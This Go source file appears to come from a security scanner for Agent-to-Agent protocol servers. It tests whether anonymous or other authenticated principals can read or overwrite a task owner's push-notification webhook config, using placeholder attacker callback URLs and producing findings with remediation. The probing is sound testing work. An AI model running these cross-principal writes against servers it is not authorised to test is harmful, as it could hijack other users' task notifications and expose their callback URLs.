package a2a

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// PushBindingExecutor checks task ownership on push-config reads and writes.
type PushBindingExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-push-binding", func(rc attack.RuleContext) attack.Executor {
		return NewPushBindingExecutor(rc)
	})
}

func NewPushBindingExecutor(r attack.RuleContext) *PushBindingExecutor {
	return &PushBindingExecutor{rule: r}
}

func (e *PushBindingExecutor) Produces() []attack.ArtifactKind { return nil }

func (e *PushBindingExecutor) Requires() []attack.ArtifactKind {
	return []attack.ArtifactKind{attack.ArtifactTaskID}
}

func (e *PushBindingExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	return e.ExecuteChained(ctx, target, opts, attack.NewBlackboard())
}

func (e *PushBindingExecutor) ExecuteChained(ctx context.Context, target string, opts attack.Options, bb *attack.Blackboard) (findings []attack.Finding, err error) {
	ctx = withTenantRouting(ctx)
	if len(opts.Principals) == 0 || len(principalHeaders(opts.Principals[0])) == 0 {
		return nil, fmt.Errorf("%w: an authenticated task owner is required", attack.ErrInconclusive)
	}
	vars := attack.NewVars(target, opts.OOBListenerURL)
	endpoint, jsonRPC := resolveA2AEndpoint(ctx, attack.NewUnauthHTTPClient(opts, vars), vars.BaseURL)
	if jsonRPC {
		rpcFindings, rpcErr := e.probeJSONRPC(ctx, target, endpoint, opts, bb)
		findings = append(findings, rpcFindings...)
		err = errors.Join(err, rpcErr)
	}
	restFindings, restErr, restAdvertised := e.probeREST(ctx, vars.BaseURL, opts, vars.RandID)
	findings = append(findings, restFindings...)
	err = errors.Join(err, restErr)
	if !jsonRPC {
		err = errors.Join(err, advertisedJSONRPCUnavailable(ctx, attack.NewUnauthHTTPClient(opts, vars), vars.BaseURL))
	}
	if !jsonRPC && !restAdvertised {
		return nil, errors.Join(err, attack.ErrInconclusive)
	}
	return findings, err
}

func (e *PushBindingExecutor) probeJSONRPC(ctx context.Context, target, endpoint string, opts attack.Options, bb *attack.Blackboard) (findings []attack.Finding, err error) {
	a := opts.Principals[0]

	vars := attack.NewVars(target, opts.OOBListenerURL)
	clientA := principalClient(opts, vars, a)
	unauthClient := attack.NewUnauthHTTPClient(opts, attack.NewVars(target, opts.OOBListenerURL))

	// Establish a task owned by A.
	taskID, consumed := e.ownedTask(bb, a)
	var obs setupObservation
	if taskID == "" {
		taskID, obs = e.createTask(ctx, clientA, endpoint, a, vars.RandID)
	}
	if taskID == "" {
		// No owner task means the binding was not tested.
		return nil, obs.err()
	}
	var incomplete error
	defer func() { err = errors.Join(err, incomplete) }()
	if !consumed {
		incomplete = obs.partialErr()
	}
	var registrations []*pushRegistration
	register := func(set pushSet, callbackURL string) {
		if !set.accepted {
			return
		}
		version := "0.3.0"
		if set.v1 {
			version = "1.0"
		}
		registrations = append(registrations, &pushRegistration{
			endpoint: endpoint, taskID: taskID, configID: set.id,
			callbackURL: callbackURL, version: version, authHeaders: a.Headers,
		})
	}
	defer func() {
		for i := len(registrations) - 1; i >= 0; i-- {
			line := registrations[i].finish(ctx, clientA, opts.TargetState, false)
			for j := range findings {
				findings[j].Evidence += "\n" + line
			}
		}
	}()

	// Require a stored owner config before testing access by B.
	markerURL := "https://batesian-victim-" + vars.RandID + ".example/cb"
	markerTok := "victim-tok-" + vars.RandID
	ownerSet := e.setPush(ctx, clientA, endpoint, a.Headers, "configuring the task owner's push-notification webhook",
		taskID, markerURL, markerTok, "owner-"+vars.RandID, vars.RandID)
	if !ownerSet.accepted {
		return nil, ownerSet.obs.err()
	}
	register(ownerSet, markerURL)
	incomplete = errors.Join(incomplete, ownerSet.partialErr("owner push configuration"))
	if !e.getPush(ctx, clientA, endpoint, a.Headers, taskID, ownerSet, markerURL, vars.RandID+"-owner") {
		return nil, attack.ErrInconclusive
	}
	if readTaskAccess(ctx, clientA, endpoint, a.Headers, taskID, ownerSet.v1, vars.RandID+"-owner") != taskPresent {
		return nil, fmt.Errorf("%w: owner could not read the probe task", attack.ErrInconclusive)
	}

	// Confirm an anonymous write through the owner's readback.
	openURL := "https://batesian-open-" + vars.RandID + ".example/cb"
	var openSet pushSet
	if readTaskAccess(ctx, unauthClient, endpoint, nil, taskID, ownerSet.v1, vars.RandID+"-anonymous") == taskDenied {
		openSet = e.setPush(ctx, unauthClient, endpoint, nil, "configuring a push-notification webhook anonymously",
			taskID, openURL, "x", "open-"+vars.RandID, vars.RandID)
	} else {
		incomplete = errors.Join(incomplete, fmt.Errorf("%w: anonymous task-read scope was not confirmed", attack.ErrInconclusive))
	}
	if openSet.accepted {
		register(openSet, openURL)
		incomplete = errors.Join(incomplete, openSet.partialErr("anonymous push configuration"))
		matched, judged := e.getPushOutcome(ctx, clientA, endpoint, a.Headers, taskID, openSet, openURL, vars.RandID+"-open")
		if matched {
			return []attack.Finding{e.anonymousWriteFinding(endpoint, a, taskID, openURL, consumed, "GetTask")}, nil
		}
		if !judged {
			incomplete = errors.Join(incomplete, fmt.Errorf("%w: anonymous push-config write readback was unjudged", attack.ErrInconclusive))
		}
	}
	if !e.getPush(ctx, clientA, endpoint, a.Headers, taskID, ownerSet, markerURL, vars.RandID+"-baseline") {
		return nil, attack.ErrInconclusive
	}
	if len(opts.Principals) < 2 {
		return nil, fmt.Errorf("%w: a second principal is required to test cross-principal access", attack.ErrInconclusive)
	}
	_, b, err := twoPrincipals(opts)
	if err != nil {
		return nil, err
	}
	clientB := principalClient(opts, vars, b)
	if readTaskAccess(ctx, clientB, endpoint, b.Headers, taskID, ownerSet.v1, vars.RandID+"-other") != taskDenied {
		return nil, fmt.Errorf("%w: principal %q was not confirmed outside the task's access scope", attack.ErrInconclusive, b.Name)
	}

	// Read before writing so B can observe A's original config.
	crossRead, crossReadJudged := e.getPushOutcome(ctx, clientB, endpoint, b.Headers, taskID,
		ownerSet, markerURL, vars.RandID+"-cross-read")
	if crossRead {
		findings = append(findings, e.readFinding(endpoint, a, b, taskID, markerURL, consumed, "GetTask"))
	}
	attackerURL := "https://batesian-attacker-" + vars.RandID + ".example/cb"
	attackerSet := e.setPush(ctx, clientB, endpoint, b.Headers, "configuring a push-notification webhook as principal "+b.Name,
		taskID, attackerURL, "attacker-tok-"+vars.RandID, "attacker-"+vars.RandID, vars.RandID)
	if attackerSet.accepted {
		register(attackerSet, attackerURL)
		incomplete = errors.Join(incomplete, attackerSet.partialErr("cross-principal push configuration"))
	}
	attackerWriteVerified := attackerSet.accepted && e.getPush(ctx, clientA, endpoint, a.Headers, taskID, attackerSet, attackerURL, vars.RandID+"-cross-write")
	if attackerWriteVerified {
		findings = append(findings, e.writeFinding(endpoint, a, b, taskID, attackerURL, consumed, "GetTask"))
	}
	if attackerSet.accepted && !attackerWriteVerified {
		return findings, attack.ErrInconclusive
	}
	if !openSet.accepted && !openSet.judged {
		return findings, fmt.Errorf("%w: anonymous push-config write did not establish whether task %s was writable",
			attack.ErrInconclusive, taskID)
	}
	if !attackerSet.accepted && !attackerSet.judged {
		return findings, fmt.Errorf("%w: principal %s's push-config write did not establish whether task %s was writable",
			attack.ErrInconclusive, b.Name, taskID)
	}
	if !crossReadJudged {
		return findings, fmt.Errorf("%w: principal %s's push-config read did not establish whether task %s was accessible",
			attack.ErrInconclusive, b.Name, taskID)
	}
	return findings, nil
}

func (e *PushBindingExecutor) ownedTask(bb *attack.Blackboard, a attack.Principal) (taskID string, consumed bool) {
	for _, art := range bb.ByKind(attack.ArtifactTaskID) {
		if art.Value != "" && art.Principal == a.Name {
			return art.Value, true
		}
	}
	return "", false
}

// Both wire attempts contribute to setup classification.
func (e *PushBindingExecutor) createTask(ctx context.Context, c *attack.HTTPClient, endpoint string,
	p attack.Principal, randID string) (string, setupObservation) {
	var obs setupObservation
	headers := pushBindingHeaders(p.Headers, true)
	requestID := "batesian-pb-create-" + p.Name + "-" + randID
	resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      requestID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"configuration": map[string]interface{}{"returnImmediately": true},
			"message": map[string]interface{}{
				"role":      1,
				"parts":     []interface{}{map[string]string{"text": "batesian push-binding probe " + randID}},
				"messageId": "batesian-pb-" + p.Name + "-" + randID,
			},
		},
	})
	if err != nil || !taskSetupReplyAccepted(resp, requestID) {
		obs.observe(correlatedTaskSetup("creating a probe task as principal "+p.Name, endpoint,
			principalCredentialPresent(c, endpoint, p.Headers), resp, requestID))
		requestID += "-v03"
		resp, err = c.POST(ctx, endpoint, pushBindingHeaders(p.Headers, false), map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      requestID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": "batesian push-binding probe " + randID}},
					"messageId": "batesian-pb-" + p.Name + "-" + randID,
				},
			},
		})
	}
	if err != nil || !taskSetupReplyAccepted(resp, requestID) {
		obs.observe(correlatedTaskSetup("creating a probe task as principal "+p.Name, endpoint,
			principalCredentialPresent(c, endpoint, p.Headers), resp, requestID))
		return "", obs
	}
	taskID, _ := extractTaskContext(resp.Body)
	if taskID == "" {
		obs.observe(correlatedTaskSetup("creating a probe task as principal "+p.Name, endpoint,
			principalCredentialPresent(c, endpoint, p.Headers), resp, requestID))
	}
	return taskID, obs
}

type pushSet struct {
	accepted bool
	judged   bool
	partial  bool
	v1       bool
	id       string
	obs      setupObservation
}

func (s pushSet) partialErr(what string) error {
	if !s.partial {
		return nil
	}
	return fmt.Errorf("%w: %s had an unjudged attempt before fallback succeeded", attack.ErrInconclusive, what)
}

// setPush tries v1 first, then v0.3. It keeps setup failures for the owner control.
func (e *PushBindingExecutor) setPush(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, what, taskID, url, token, configID, randID string) pushSet {
	cfg := map[string]string{"id": configID, "url": url, "token": token}
	attempts := []struct {
		method string
		params map[string]interface{}
	}{
		{"CreateTaskPushNotificationConfig", map[string]interface{}{"taskId": taskID, "id": configID, "url": url, "token": token}},
		{"tasks/pushNotificationConfig/set", map[string]interface{}{"taskId": taskID, "pushNotificationConfig": cfg}},
	}
	var obs setupObservation
	denied := false
	unjudged := false
	for _, at := range attempts {
		requestID := "batesian-pb-set-" + randID + "-" + configID + "-" + at.method
		headers := pushBindingHeaders(extra, at.method == "CreateTaskPushNotificationConfig")
		resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      requestID,
			"method":  at.method,
			"params":  at.params,
		})
		if err == nil && pushRegistrationReplyAccepted(resp, requestID, at.method, taskID, url) {
			if returned := pushResult(resp.Body, requestID); returned != nil {
				set := pushSet{accepted: true, judged: true, partial: unjudged, v1: at.method == "CreateTaskPushNotificationConfig", id: configID}
				if id, _ := returned["id"].(string); id != "" {
					set.id = id
				} else if nested, ok := returned["pushNotificationConfig"].(map[string]interface{}); ok {
					if id, _ := nested["id"].(string); id != "" {
						set.id = id
					}
				}
				return set
			}
		}
		switch classifyPushWriteResponse(resp, err, requestID) {
		case pushWriteDenied:
			denied = true
		case pushWriteUnjudged:
			unjudged = true
		}
		obs.observe(classifyTaskSetup(what, endpoint, principalCredentialPresent(c, endpoint, extra), resp))
	}
	return pushSet{judged: denied && !unjudged, obs: obs}
}

type pushWriteOutcome uint8

const (
	pushWriteUnjudged pushWriteOutcome = iota
	pushWriteAbsent
	pushWriteDenied
)

func classifyPushWriteResponse(resp *attack.Response, err error, requestID string) pushWriteOutcome {
	if err != nil || resp == nil {
		return pushWriteUnjudged
	}
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return pushWriteDenied
	}
	if resp.StatusCode == 404 || resp.StatusCode == 405 {
		return pushWriteAbsent
	}
	if resp.StatusCode == 408 || resp.StatusCode == 429 || resp.StatusCode >= 500 {
		return pushWriteUnjudged
	}
	_, code, hasError, valid := discoveryResponse(resp.Body, requestID)
	if !valid || !hasError {
		return pushWriteUnjudged
	}
	switch code {
	case jsonRPCMethodNotFound, a2aPushNotSupported, a2aUnsupportedOperation:
		return pushWriteAbsent
	}
	message := strings.ToLower(jsonRPCErrorMessage(resp.Body))
	if code == -32001 || attack.AuthFlavoredMessage(message) || strings.Contains(message, "auth required") ||
		strings.Contains(message, "not task owner") || strings.Contains(message, "not found") {
		return pushWriteDenied
	}
	return pushWriteUnjudged
}

func pushResult(body []byte, requestID string) map[string]interface{} {
	var envelope struct {
		JSONRPC string                 `json:"jsonrpc"`
		ID      string                 `json:"id"`
		Result  map[string]interface{} `json:"result"`
	}
	if json.Unmarshal(body, &envelope) != nil || envelope.JSONRPC != "2.0" || envelope.ID != requestID {
		return nil
	}
	return envelope.Result
}

func (e *PushBindingExecutor) getPush(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, taskID string, set pushSet, expectedURL, randID string) bool {
	matched, _ := e.getPushOutcome(ctx, c, endpoint, extra, taskID, set, expectedURL, randID)
	return matched
}

// getPushOutcome distinguishes a denied or mismatched read from an unjudged one.
func (e *PushBindingExecutor) getPushOutcome(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, taskID string, set pushSet, expectedURL, randID string) (matched, judged bool) {
	method := "tasks/pushNotificationConfig/get"
	params := map[string]interface{}{"id": taskID, "pushNotificationConfigId": set.id}
	if set.v1 {
		method = "GetTaskPushNotificationConfig"
		params = map[string]interface{}{"taskId": taskID, "id": set.id}
	}
	headers := pushBindingHeaders(extra, set.v1)
	requestID := "batesian-pb-get-" + randID
	resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
		"jsonrpc": "2.0", "id": requestID,
		"method": method, "params": params,
	})
	if err != nil || resp == nil {
		return false, false
	}
	if resp.StatusCode == 401 || resp.StatusCode == 403 || resp.StatusCode == 404 {
		return false, true
	}
	if !resp.IsAccepted() {
		_, code, hasError, valid := discoveryResponse(resp.Body, requestID)
		if resp.IsSuccess() && valid && hasError {
			message := strings.ToLower(jsonRPCErrorMessage(resp.Body))
			if code == -32001 || attack.AuthFlavoredMessage(message) ||
				strings.Contains(message, "not task owner") || strings.Contains(message, "not found") {
				return false, true
			}
		}
		return false, false
	}
	result := pushResult(resp.Body, requestID)
	if result == nil {
		return false, false
	}
	if returnedTask, ok := result["taskId"]; ok && returnedTask != taskID {
		return false, false
	}
	config := result
	if !set.v1 {
		var ok bool
		config, ok = result["pushNotificationConfig"].(map[string]interface{})
		if !ok {
			return false, false
		}
		if returnedID, ok := config["id"]; ok && returnedID != set.id {
			return false, false
		}
	} else if returnedID, ok := result["id"]; ok && returnedID != set.id {
		return false, false
	}
	returnedURL, ok := config["url"].(string)
	if !ok || returnedURL == "" {
		return false, false
	}
	return returnedURL == expectedURL, true
}

func pushBindingHeaders(extra map[string]string, v1 bool) map[string]string {
	headers := make(map[string]string, len(extra)+1)
	for k, v := range extra {
		if !strings.EqualFold(k, "A2A-Version") {
			headers[k] = v
		}
	}
	if v1 {
		headers["A2A-Version"] = "1.0"
	}
	return headers
}

func (e *PushBindingExecutor) anonymousWriteFinding(endpoint string, owner attack.Principal, taskID, callbackURL string, consumed bool, taskControl string) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config writable without authentication",
		Description: fmt.Sprintf(
			"An unauthenticated request attached a push-notification callback (%s) to task %s, owned by %q. "+
				"The owner read back the stored config. Notification delivery was not tested.",
			callbackURL, taskID, owner.Name),
		Evidence: fmt.Sprintf("owner: %s\ntask: %s\nowner readback URL: %s\ntask origin: %s\n%s control: denied anonymously",
			owner.Name, taskID, callbackURL, taskOrigin(consumed), taskControl),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "task owned by " + owner.Name},
			{Hop: 2, Principal: "anonymous", Action: "set push config on " + taskID, Outcome: "GRANTED - anonymous callback stored"},
		},
	}
}

func (e *PushBindingExecutor) writeFinding(endpoint string, owner, attacker attack.Principal, taskID, attackerURL string, consumed bool, taskControl string) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config writable across principals",
		Description: fmt.Sprintf(
			"Principal %q attached a push-notification callback (%s) to task %s, which is owned by "+
				"principal %q, using only its own valid credentials. The push control plane is "+
				"authenticated but not bound to the task owner. Notification delivery was not tested.",
			attacker.Name, attackerURL, taskID, owner.Name),
		Evidence: fmt.Sprintf("owner: %s\nattacker: %s\ntask: %s\nowner readback URL: %s\ntask origin: %s\n%s control: denied for other principal",
			owner.Name, attacker.Name, taskID, attackerURL, taskOrigin(consumed), taskControl),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "task owned by " + owner.Name},
			{Hop: 2, Principal: attacker.Name, Action: "set push config on " + taskID + " (cross-principal)", Outcome: "GRANTED - attacker callback attached"},
		},
	}
}

func (e *PushBindingExecutor) readFinding(endpoint string, owner, attacker attack.Principal, taskID, markerURL string, consumed bool, taskControl string) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config readable across principals",
		Description: fmt.Sprintf(
			"Principal %q read the push-notification config of task %s, owned by principal %q, and "+
				"the response disclosed %q's configured callback URL (%s). The callback token was not verified.",
			attacker.Name, taskID, owner.Name, owner.Name, markerURL),
		Evidence: fmt.Sprintf("owner: %s\nattacker: %s\ntask: %s\nleaked callback URL: %s\ntask origin: %s\n%s control: denied for other principal",
			owner.Name, attacker.Name, taskID, markerURL, taskOrigin(consumed), taskControl),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "callback URL configured (secret)"},
			{Hop: 2, Principal: attacker.Name, Action: "get push config of " + taskID + " (cross-principal)", Outcome: "GRANTED - owner's callback URL disclosed"},
		},
	}
}

func taskOrigin(consumed bool) string {
	if consumed {
		return "reused from upstream blackboard artifact (cross-rule chain)"
	}
	return "created during this scan"
}
